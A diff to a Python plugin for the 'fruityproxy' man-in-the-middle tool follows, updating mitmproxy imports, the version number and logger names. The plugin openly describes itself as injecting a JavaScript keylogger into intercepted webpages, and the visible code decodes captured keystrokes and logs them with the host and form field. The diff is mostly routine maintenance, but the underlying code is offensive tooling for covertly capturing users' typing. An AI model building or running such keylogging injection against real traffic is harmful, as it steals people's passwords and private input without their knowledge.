@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 
-# Copyright (C) 2015 xtr4nge [_AT_] gmail.com, Marcello Salvati (@byt3bl33d3r)
+# Copyright (C) 2015-2016 xtr4nge [_AT_] gmail.com, Marcello Salvati (@byt3bl33d3r)
 #
 # This program is free software: you can redistribute it and/or modify
 # it under the terms of the GNU General Public License as published by
@@ -17,10 +17,10 @@
 #
 
 from plugins.plugin import Plugin
-from libmproxy.protocol.http import decoded # mitmproxy 0.12
+from libmproxy.models import decoded # mitmproxy 0.15
 
 import logging
-fruityproxy_logger = logging.getLogger("fruityproxy")
+logger = logging.getLogger("fruityproxy")
 
 '''
 Based on MITMf JSkeyLogger plugin: https://github.com/byt3bl33d3r/MITMf/
@@ -28,7 +28,7 @@ Based on MITMf JSkeyLogger plugin: https://github.com/byt3bl33d3r/MITMf/
 
 class KeyLogger(Plugin):
     name = 'KeyLogger'
-    version = "1.0"
+    version = "1.1"
     desc = 'Injects a javascript keylogger into clients webpages'
     content_path = "./content/KeyLogger/msfkeylogger.js"
 
@@ -54,9 +54,9 @@ class KeyLogger(Plugin):
                         try:
                             nice += n.decode('hex')
                         except:
-                            fruityproxy_logger.debug("["+self.name+"] Error decoding char: {}".format(n))
+                            logger.debug("["+self.name+"] Error decoding char: {}".format(n))
 
-                fruityproxy_logger.debug("["+self.name+"] Host: {} | Field: {} | Keys: {}".format(flow.request.host, input_field, nice))
+                logger.debug("["+self.name+"] Host: {} | Field: {} | Keys: {}".format(flow.request.host, input_field, nice))
 
     def response(self, flow):
         with decoded(flow.response):
